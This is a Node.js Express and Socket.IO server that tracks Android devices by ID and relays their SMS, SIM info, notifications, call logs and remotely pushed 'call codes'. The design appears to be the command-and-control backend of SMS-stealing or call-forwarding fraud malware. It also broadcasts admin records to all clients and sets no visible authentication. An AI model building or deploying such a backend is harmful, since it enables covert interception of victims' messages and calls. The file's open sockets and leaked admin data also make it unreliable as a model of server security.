import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// ======================================================
// 🔧 HELPERS
// ======================================================

// ek hi jagah se ID clean karenge
function cleanId(id) {
  if (!id) return null;
  return id.toString().trim().toUpperCase();
}

// deviceId → socketId
const deviceSockets = new Map();
// deviceId → Set(socketId)  (web pages jo single device dekh rahe hain)
const watchers = new Map();

function notifyWatchers(uniqueid, payload) {
  const w = watchers.get(uniqueid);
  if (!w) return;
  for (let sid of w) {
    io.to(sid).emit("deviceStatusSingle", payload);
  }
}

// ======================================================
// 🔥 SOCKET IO
// ======================================================
io.on("connection", (socket) => {
  console.log("🟢 New Socket Connected:", socket.id);

  let currentUniqueId = null; // cleaned id jo is socket se map hai

  // 👁 WATCH DEVICE (web UI)
  socket.on("watchDevice", (rawId) => {
    const uniqueid = cleanId(rawId);
    if (!uniqueid) return;

    if (!watchers.has(uniqueid)) watchers.set(uniqueid, new Set());
    watchers.get(uniqueid).add(socket.id);

    console.log(`👁 Watching Device → ${uniqueid}`);
  });

  socket.on("unwatchDevice", (rawId) => {
    const uniqueid = cleanId(rawId);
    if (!uniqueid) return;

    if (watchers.has(uniqueid)) {
      watchers.get(uniqueid).delete(socket.id);
    }
  });

  // ======================================================
  // 📌 REGISTER DEVICE (JOIN ROOM)
  // ======================================================
  socket.on("registerDevice", (rawId) => {
    const uniqueid = cleanId(rawId);
    if (!uniqueid) return;

    console.log("🔗 CLEAN REGISTER:", uniqueid);

    // map & room
    deviceSockets.set(uniqueid, socket.id);
    currentUniqueId = uniqueid;

    socket.join(uniqueid);

    saveLastSeen(uniqueid, "Online");

    // ack to that device only
    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    // admin/dashboard ke liye list update
    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });

    // single-device page watchers
    notifyWatchers(uniqueid, {
      uniqueid,
      connectivity: "Online",
      updatedAt: new Date(),
    });
  });

  // ======================================================
  // 🔵 DEVICE STATUS
  //  - Android se har 5s / n seconds aata hai
  //  - yaha se: DB lastSeen update + SAB ko broadcast
  // ======================================================
  socket.on("deviceStatus", (data = {}) => {
    let { uniqueid, connectivity } = data;

    uniqueid = cleanId(uniqueid);
    if (!uniqueid) return;

    if (!connectivity) connectivity = "Online";

    console.log(`⚡ STATUS: ${uniqueid} → ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    const payload = {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    };

    // ⭐ IMPORTANT:
    // sab clients ko bhejo → web "Devices Live" page isi se Active/Offline dikhata hai
    io.emit("deviceStatus", payload);

    // watchers (device details page)
    notifyWatchers(uniqueid, payload);
  });

  // ======================================================
  // 🔴 DISCONNECT
  // ======================================================
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentUniqueId) {
      const clean = cleanId(currentUniqueId);
      const latestSocket = deviceSockets.get(clean);

      if (latestSocket === socket.id) {
        console.log("🛑 DEVICE OFFLINE:", clean);

        deviceSockets.delete(clean);
        saveLastSeen(clean, "Offline");

        const payload = {
          uniqueid: clean,
          connectivity: "Offline",
          updatedAt: new Date(),
        };

        // sab ko offline status
        io.emit("deviceStatus", payload);

        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          uniqueid: clean,
        });

        notifyWatchers(clean, payload);
      }
    }

    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// ======================================================
// 🔥 SAVE LAST SEEN
// ======================================================
async function saveLastSeen(rawId, connectivity) {
  try {
    const uniqueid = cleanId(rawId);
    if (!uniqueid) return;

    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message);
  }
}

// ======================================================
// 🔥 SEND CALL CODE TO TARGET DEVICE ONLY
// ======================================================
export async function sendCallCodeToDevice(rawId, callData) {
  const uniqueid = cleanId(rawId);
  if (!uniqueid) return;

  io.to(uniqueid).emit("callCodeUpdate", callData);
  console.log(`📞 CallCode Sent → ${uniqueid}`);
}

// ======================================================
// 🔥 ADMIN UPDATE (GLOBAL)
// ======================================================
export function sendAdminGlobal(adminData) {
  console.log("👑 REALTIME ADMIN EMIT SENT:", adminData);
  io.emit("adminUpdate", JSON.stringify(adminData));
}

// ======================================================
// 🔥 MONGO STREAMS WITH RETRY
// ======================================================
mongoose.connection.once("open", () => {
  console.log("📡 Mongo Streams Active...");

  const watchWithRetry = (collection, callback) => {
    const start = () => {
      try {
        const stream = mongoose.connection.collection(collection).watch();

        stream.on("change", async (change) => {
          if (!["insert", "update", "replace"].includes(change.operationType)) return;

          const updated = await mongoose
            .connection
            .collection(collection)
            .findOne({ _id: change.documentKey._id });

          if (updated) callback(updated);
        });

        stream.on("error", () => {
          setTimeout(start, 5000);
        });
      } catch {
        setTimeout(start, 5000);
      }
    };
    start();
  };

  // devices collection changes → admin list update
  watchWithRetry("devices", (data) => {
    io.emit("deviceListUpdated", { event: "db_change", device: data });
  });

  // siminfos changes
  watchWithRetry("siminfos", (data) => {
    io.emit("simInfoUpdated", data);
  });

  // callcodes changes
  watchWithRetry("callcodes", (data) => {
    if (data.uniqueid) sendCallCodeToDevice(data.uniqueid, data);
  });

  // sms changes
  watchWithRetry("sms", (data) => {
    if (!data.uniqueid) return;
    const id = cleanId(data.uniqueid);
    io.to(id).emit("smsUpdate", data);
  });

  // admins changes
  watchWithRetry("admins", (data) => {
    sendAdminGlobal(data);
  });
});

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

app.get("/", (req, res) =>
  res.send("🔥 Stable Socket Backend Running (uniqueid Room + Broadcast Mode)")
);

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running at http://localhost:${PORT}`)
);
